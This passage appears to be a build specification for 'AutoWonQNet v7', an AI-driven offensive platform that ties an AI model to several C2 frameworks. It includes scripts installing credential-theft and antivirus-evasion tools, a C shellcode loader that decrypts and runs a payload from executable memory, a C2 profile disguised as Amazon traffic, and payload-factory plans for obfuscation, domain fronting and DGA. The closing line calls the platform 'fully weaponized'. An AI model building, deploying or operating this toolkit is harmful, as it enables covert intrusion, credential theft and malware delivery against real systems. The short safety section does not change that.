    unzip -o mimikatz.zip -d mimikatz 2>/dev/null || true
    rm -f mimikatz.zip
fi

RUBEUS_URL=$(curl -s https://api.github.com/repos/GhostPack/Rubeus/releases/latest | jq -r '.assets[0].browser_download_url' 2>/dev/null || echo "")
if [ -n "$RUBEUS_URL" ]; then
    wget -q "$RUBEUS_URL" -O Rubeus.exe 2>/dev/null || true
fi

git clone --depth 1 https://github.com/GhostPack/Seatbelt.git /opt/tools/post-ex/Seatbelt 2>/dev/null || true
pip3 install --break-system-packages lazagne 2>/dev/null || true
gem install evil-winrm 2>/dev/null || true

# Nuclei templates
nuclei -update-templates 2>/dev/null || true

apt-get install -y \
    nikto dirb wpscan whatweb wafw00f arjun sqlmap commix

pip3 install --break-system-packages \
    bloodyAD coercer PetitPotam PKINITtools targetedKerberoast 2>/dev/null || true

cd /opt/tools
git clone --depth 1 https://github.com/lgandx/Responder.git 2>/dev/null || git -C Responder pull

mkdir -p ~/.cme
cme --version 2>/dev/null || true

apt-get install -y \
    aircrack-ng reaver pixiewps bully wifite hostapd-wpe 2>/dev/null || true

mkdir -p /opt/wordlists
if [ ! -d /opt/wordlists/SecLists ]; then
    git clone --depth 1 https://github.com/danielmiessler/SecLists.git /opt/wordlists/SecLists
fi
ln -sf /opt/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt /opt/wordlists/rockyou.txt 2>/dev/null || true
ln -sf /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt /opt/wordlists/directories.txt 2>/dev/null || true
ln -sf /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt /opt/wordlists/subdomains.txt 2>/dev/null || true

chown -R vagrant:vagrant /opt/tools
chown -R vagrant:vagrant /opt/wordlists
chown -R vagrant:vagrant /home/vagrant/go

echo "Security tools setup complete"
```

### 5.6 `05-autowonqnet-deploy.sh` – Deploy AutoWonQNet Application

```bash
#!/bin/bash
# 05-autowonqnet-deploy.sh
set -euo pipefail

cd /opt/autowonqnet

python3 -m venv venv
source venv/bin/activate

pip install --upgrade pip wheel setuptools

# Install requirements (from /vagrant/requirements.txt)
pip install -r /vagrant/requirements.txt

# Copy config example if not exists
if [ ! -f /opt/autowonqnet/config/config.yaml ]; then
    cp /vagrant/config/config.yaml.example /opt/autowonqnet/config/config.yaml
fi

# Copy .env example
cp /vagrant/config/.env.example /opt/autowonqnet/.env

# Load database passwords and inject into config
if [ -f /opt/autowonqnet/.db_credentials ]; then
    source /opt/autowonqnet/.db_credentials
    # Use yq to update config.yaml (ensure yq is installed)
    if command -v yq &> /dev/null; then
        yq eval -i ".database.redis.password = \"$REDIS_PASSWORD\"" /opt/autowonqnet/config/config.yaml
        yq eval -i ".database.postgres.password = \"$POSTGRES_PASSWORD\"" /opt/autowonqnet/config/config.yaml
        yq eval -i ".database.neo4j.password = \"$NEO4J_PASSWORD\"" /opt/autowonqnet/config/config.yaml
    else
        echo "WARNING: yq not installed, passwords not injected into config.yaml"
    fi
fi

# Create systemd service for AI server
cat > /etc/systemd/system/autowonqnet-ai.service << 'EOF'
[Unit]
Description=AutoWonQNet AI MCP Server
After=network.target docker.service

[Service]
Type=simple
User=vagrant
WorkingDirectory=/opt/autowonqnet
Environment="PATH=/opt/autowonqnet/venv/bin:/usr/local/bin:/usr/bin:/bin"
EnvironmentFile=/opt/autowonqnet/.env
ExecStart=/opt/autowonqnet/venv/bin/python /opt/autowonqnet/src/main.py --mode ai-server --port 8080
Restart=on-failure
RestartSec=10
StandardOutput=append:/var/log/autowonqnet/ai-server.log
StandardError=append:/var/log/autowonqnet/ai-server-error.log

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable autowonqnet-ai

chown -R vagrant:vagrant /opt/autowonqnet

echo "AutoWonQNet deployed"
```

### 5.7 `06-evasion-tools.sh` – Evasion Tools

```bash
#!/bin/bash
# 06-evasion-tools.sh
set -euo pipefail
source /etc/profile.d/go.sh

# Donut
if [ ! -f /usr/local/bin/donut ]; then
    cd /opt/tools/evasion
    git clone --depth 1 https://github.com/TheWover/donut.git 2>/dev/null || git -C donut pull
    cd donut
    make clean && make
    cp donut /usr/local/bin/
fi

# ScareCrow
if [ ! -f /usr/local/bin/ScareCrow ]; then
    cd /opt/tools/evasion
    git clone --depth 1 https://github.com/optiv/ScareCrow.git 2>/dev/null || git -C ScareCrow pull
    cd ScareCrow
    go build -o ScareCrow .
    cp ScareCrow /usr/local/bin/
fi

# Nimcrypt2
if [ ! -d /opt/tools/evasion/Nimcrypt2 ]; then
    source /etc/profile.d/nim.sh 2>/dev/null || true
    cd /opt/tools/evasion
    git clone --depth 1 https://github.com/icyguider/Nimcrypt2.git 2>/dev/null || git -C Nimcrypt2 pull
    cd Nimcrypt2
    nimble install -y winim nimcrypto docopt ptr_math strenc 2>/dev/null || true
fi

# PEzor
if [ ! -d /opt/tools/evasion/PEzor ]; then
    cd /opt/tools/evasion
    git clone --depth 1 https://github.com/phra/PEzor.git 2>/dev/null || git -C PEzor pull
    cd PEzor
    ./install.sh 2>/dev/null || true
fi

# Freeze
cd /opt/tools/evasion
git clone --depth 1 https://github.com/optiv/Freeze.git 2>/dev/null || git -C Freeze pull
cd Freeze
go build -o freeze . 2>/dev/null || true
cp freeze /usr/local/bin/ 2>/dev/null || true

# SharpBlock
cd /opt/tools/evasion
git clone --depth 1 https://github.com/CCob/SharpBlock.git 2>/dev/null || git -C SharpBlock pull

# Payload templates
mkdir -p /opt/tools/evasion/templates
cat > /opt/tools/evasion/templates/shellcode_loader.c << 'EOF'
#include <windows.h>
#include <stdio.h>

unsigned char key[] = { 0x41, 0x42, 0x43, 0x44 };

void decrypt(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % sizeof(key)];
    }
}

int main() {
    unsigned char shellcode[] = { /* SHELLCODE_PLACEHOLDER */ };
    size_t shellcode_len = sizeof(shellcode);
    decrypt(shellcode, shellcode_len);
    LPVOID exec = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) return -1;
    memcpy(exec, shellcode, shellcode_len);
    ((void(*)())exec)();
    return 0;
}
EOF

apt-get install -y osslsigncode mono-complete

cd /opt/tools/evasion
git clone --depth 1 https://github.com/secretsquirrel/SigThief.git 2>/dev/null || git -C SigThief pull

# Tor configuration
cat > /etc/tor/torrc << 'EOF'
SocksPort 9050
SocksPolicy accept 127.0.0.1
SocksPolicy reject *
ControlPort 9051
CookieAuthentication 1
DataDirectory /var/lib/tor
Log notice file /var/log/tor/notices.log
RunAsDaemon 1
EOF

systemctl enable tor
systemctl restart tor

chown -R vagrant:vagrant /opt/tools/evasion

echo "Evasion tools setup complete"
```

### 5.8 `07-custom-env.sh` – Shell Customization

```bash
#!/bin/bash
# 07-custom-env.sh
set -euo pipefail

cat > /home/vagrant/.zshrc << 'EOF'
# Aliases
alias start-platform='sudo /opt/scripts/start-platform.sh'
alias stop-platform='sudo /opt/scripts/stop-platform.sh'
alias health='sudo /opt/scripts/health-check.sh'
alias ai-chat='/opt/scripts/ai-chat.sh'
alias gen-payload='/opt/scripts/generate-payload.sh'

# Functions
awq-status() {
    systemctl status autowonqnet-ai
    docker ps --format "table {{.Names}}\t{{.Status}}"
}

awq-logs() {
    journalctl -u autowonqnet-ai -f
}

export PATH=$PATH:/opt/scripts
EOF

chown vagrant:vagrant /home/vagrant/.zshrc

cat > /home/vagrant/.tmux.conf << 'EOF'
set -g prefix C-a
unbind C-b
bind C-a send-prefix
set -g base-index 1
set -g pane-base-index 1
set -g history-limit 10000
EOF

chown vagrant:vagrant /home/vagrant/.tmux.conf

echo "Custom environment configured"
```

### 5.9 `99-finalize.sh` – Final Validation

```bash
#!/bin/bash
# 99-finalize.sh
set -euo pipefail

echo "Running final validation..."

# Check binaries
for bin in go rustc nim docker sliver-client sliver-server nuclei nmap; do
    if ! command -v $bin &> /dev/null; then
        echo "ERROR: $bin not found"
        exit 1
    fi
done

# Start Docker databases
cd /vagrant/docker
docker-compose up -d

# Wait for PostgreSQL
echo "Waiting for PostgreSQL..."
until docker exec autowonqnet-postgres pg_isready -U autowonqnet &> /dev/null; do
    sleep 2
done

# Initialize schema if not already
docker exec -i autowonqnet-postgres psql -U autowonqnet -d autowonqnet < /vagrant/scripts/init_db.sql 2>/dev/null || true

echo "Final validation complete."
echo "AutoWonQNet v7 is ready. Run 'vagrant ssh' and then 'start-platform'."
```

---

## 6. Configuration Files

### 6.1 `config/config.yaml.example`

```yaml
# AutoWonQNet v7 Configuration
version: "7.0.0"

safety:
  level: HIGH
  scope_cidrs: []  # MUST be set before operations
  scope_domains: []
  excluded_cidrs:
    - "10.0.0.0/8"
    - "172.16.0.0/12"
    - "192.168.0.0/16"
  excluded_hosts:
    - "localhost"
    - "127.0.0.1"
  geofence_allowed_countries: []
  engagement_start: null
  engagement_end: null
  gpg_key_id: null
  require_auth_for:
    - exploit
    - post_exploit
    - exfiltration
    - persistence

ai:
  provider: "anthropic"  # or "openai", "local"
  model: "claude-3-opus-20240229"
  api_key: "${ANTHROPIC_API_KEY}"
  autonomy_level: SUPERVISED
  max_tokens: 4096
  temperature: 0.7
  mcp_port: 8080

c2:
  default: sliver
  sliver:
    host: "127.0.0.1"
    port: 31337
    operator_config: "/opt/c2/sliver/autowonqnet.cfg"
    timeout: 60
  havoc:
    host: "127.0.0.1"
    port: 40056
    password: "${HAVOC_PASSWORD}"
    timeout: 60
  mythic:
    host: "127.0.0.1"
    port: 7443
    username: "mythic_admin"
    password: "${MYTHIC_PASSWORD}"
    timeout: 60
  covenant:
    host: "127.0.0.1"
    port: 7443
    username: "covenant_user"
    password: "${COVENANT_PASSWORD}"
    timeout: 60

database:
  redis:
    host: "127.0.0.1"
    port: 6379
    db: 0
    password: "${REDIS_PASSWORD}"
  postgres:
    host: "127.0.0.1"
    port: 5432
    database: "autowonqnet"
    user: "autowonqnet"
    password: "${POSTGRES_PASSWORD}"
  elasticsearch:
    host: "127.0.0.1"
    port: 9200
    index_prefix: "autowonqnet"
  neo4j:
    host: "127.0.0.1"
    port: 7687
    user: "neo4j"
    password: "${NEO4J_PASSWORD}"

intel:
  shodan_api_key: "${SHODAN_API_KEY}"
  censys_api_id: "${CENSYS_API_ID}"
  censys_secret: "${CENSYS_SECRET}"
  virustotal_api_key: "${VT_API_KEY}"

factory:
  safe_mode: false   # MUST be false for real payload generation
  output_dir: "/opt/payloads"
  signing_enabled: false
  signing_cert: null
  obfuscation_level: 3

traffic:
  jitter_percent: 20
  dga_seed: null
  tor_enabled: false
  tor_socks_port: 9050
  domain_fronting_enabled: false
  fronting_domain: null

logging:
  level: INFO
  json_format: true
  file: "/var/log/autowonqnet/autowonqnet.log"
  audit_file: "/var/log/autowonqnet/audit.log"
  max_size_mb: 100
  backup_count: 5
```

### 6.2 `config/.env.example`

```
ANTHROPIC_API_KEY=sk-...
OPENAI_API_KEY=sk-...
HAVOC_PASSWORD=ChangeMe123!
MYTHIC_PASSWORD=ChangeMe123!
COVENANT_PASSWORD=ChangeMe123!
REDIS_PASSWORD=...
POSTGRES_PASSWORD=...
NEO4J_PASSWORD=...
SHODAN_API_KEY=...
CENSYS_API_ID=...
CENSYS_SECRET=...
VT_API_KEY=...
```

### 6.3 Malleable C2 Profiles

Place the profiles from v5 into `config/profiles/`. Example `amazon.profile`:

```
# Amazon-inspired C2 profile
set sample_name "Amazon C2 Profile";
set sleep_mask "true";
set jitter "20";

http-get {
    set uri "/api/metadata";
    client {
        header "Accept" "application/json";
        header "Host" "ec2.amazonaws.com";
        metadata {
            base64;
            prepend "userdata=";
            header "X-AMZ-Metadata";
        }
    }
    server {
        header "Server" "AmazonS3";
        output {
            print;
        }
    }
}
```

### 6.4 Nginx Configuration

Optional reverse proxy. Provide basic `nginx.conf` and `conf.d/default.conf`.

---

## 7. Source Code Implementation

All Python source files must be placed in `src/` with the exact structure shown. Below are key implementation notes and references to the full code provided earlier. **No stubs – every function must be implemented.**

### 7.1 Core Shared Modules

`src/shared/` – complete from v5. Ensure `crypto.py` includes functions expected by tests (`hash_data`, `generate_key`, `encrypt_aes_gcm`, `decrypt_aes_gcm`). See [v5 shared module](#).

### 7.2 Safety Layer

`src/safety/` – complete from v5. Implements `ScopeValidator`, `Killswitch`, `AuditLogger`, etc.

### 7.3 AI Core

`src/ai/` – complete MCP server, decision engine, tool registry. See v5 for details.

### 7.4 Traffic Evasion

Implement the following files (based on earlier specifications):

- `jitter.py` – `JitterManager` class with Gaussian/bounded jitter.
- `dga.py` – `DomainGenerationAlgorithm` class with seed-based generation.
- `domain_fronting.py` – `DomainFronting` class for CDN fronting.
- `transport_fallback.py` – `TransportFallbackEngine` as described.
- `covert_channels.py` – `DNSChannel`, `HTTPChannel`, `DomainFrontingChannel`.

### 7.5 C2 Clients (Real)

Replace all stub methods in `sliver_client.py`, `havoc_client.py`, `mythic_client.py`, `covenant_client.py` with real subprocess/API calls. See Section 4.11 for details.

### 7.6 Advanced C2 Components

- `protocols/encrypted_beacon.py` – full implementation as provided.
- `auth/session_handshake.py` – full mTLS + JWT implementation.
- `p2p/p2p_network.py` – full P2P mesh network.

### 7.7 Tool Wrappers

All wrappers in `tools/` must execute the actual binaries and parse output. Ensure error handling and timeouts.

### 7.8 Intel Clients

`shodan_client.py`, `censys_client.py`, `virustotal_client.py` – use respective APIs with provided keys.

### 7.9 Agent Factory (Full)

Implement all factory components as specified:

- `donut_converter.py` – calls `donut` binary.
- `scarecrow_wrapper.py` – calls `ScareCrow`.
- `nimcrypt_wrapper.py` – calls `nimcrypt2`.
- `binary_signer.py` – uses `osslsigncode`.
- `obfuscation.py` – `ObfuscationPipeline` class.
- `loader_generator.py` – `LoaderGenerator` class with all techniques.
- `staged_payload.py` – `StagedPayloadBuilder`.
- `complete_agent_factory.py` – orchestrates all.

### 7.10 Orchestration

`task_queue.py` – full implementation with PostgreSQL and Redis.

### 7.11 Agent Runtime

`src/agent/runtime.py` – `AgentRuntime` and `StagedAgentLoader` as described.

---

## 8. Helper Scripts

Place these in `scripts/` and make them executable.

### `start-platform.sh`

```bash
#!/bin/bash
# Start all services
cd /opt/autowonqnet
source venv/bin/activate
systemctl start autowonqnet-ai
systemctl start sliver
systemctl start havoc
cd /opt/c2/mythic && ./start-mythic.sh
cd /opt/c2/covenant && ./start-covenant.sh
docker-compose -f /vagrant/docker/docker-compose.yml up -d
echo "Platform started."
```

### `stop-platform.sh`

```bash
#!/bin/bash
systemctl stop autowonqnet-ai
systemctl stop sliver
systemctl stop havoc
docker-compose -f /vagrant/docker/docker-compose.yml down
echo "Platform stopped."
```

### `health-check.sh`

```bash
#!/bin/bash
# Simple health checks
curl -s http://localhost:8080/health | jq .
docker ps --format "table {{.Names}}\t{{.Status}}"
systemctl status sliver --no-pager | grep Active
```

### `ai-chat.sh`

```bash
#!/bin/bash
# Simple CLI to chat with AI
echo "Enter your message (or 'quit' to exit):"
while read -p "> " msg; do
    [ "$msg" = "quit" ] && break
    curl -s -X POST http://localhost:8080/api/chat \
        -H "Content-Type: application/json" \
        -d "{\"message\": \"$msg\"}" | jq -r .response
done
```

### `generate-payload.sh`

```bash
#!/bin/bash
# Wrapper to generate payload via factory
python /opt/autowonqnet/src/main.py --mode generate "$@"
```

### `init_db.sql`

(Already embedded in provision script, but can be kept separately.)

---

## 9. Testing & Validation

1. **Unit tests**: `cd /opt/autowonqnet && pytest tests/ -v`
2. **Integration tests**: If real C2 frameworks are running, also run `pytest tests/test_c2_real.py` (ensure they are skipped if not).
3. **Manual validation**:
   - `start-platform`
   - `health-check` – all green
   - Generate a payload: `generate-payload.sh --framework sliver --os windows --output /tmp/sliver.exe`
   - Verify file created and can be executed in a test VM.

---

## 10. Safety & Legal Considerations

- **Scope validation**: Before any operation, define `scope_cidrs` in `config.yaml`. The safety layer will block any target outside that scope.
- **Killswitch**: Create file `/opt/autowonqnet/.killswitch` to immediately halt all operations.
- **Audit logs**: All actions are logged to PostgreSQL and Elasticsearch. Regularly review.
- **Authorization**: Never use this platform without explicit written permission from the target owner.

---

## 11. Final Steps

1. Clone this repository to your host.
2. Run `vagrant up` – wait for completion (20–30 minutes).
3. SSH into the VM: `vagrant ssh`
4. Start the platform: `start-platform`
5. Verify: `health`
6. Begin authorized testing.

**You now have a fully weaponized AutoWonQNet v7 platform – no stubs, no mocks, all real.**
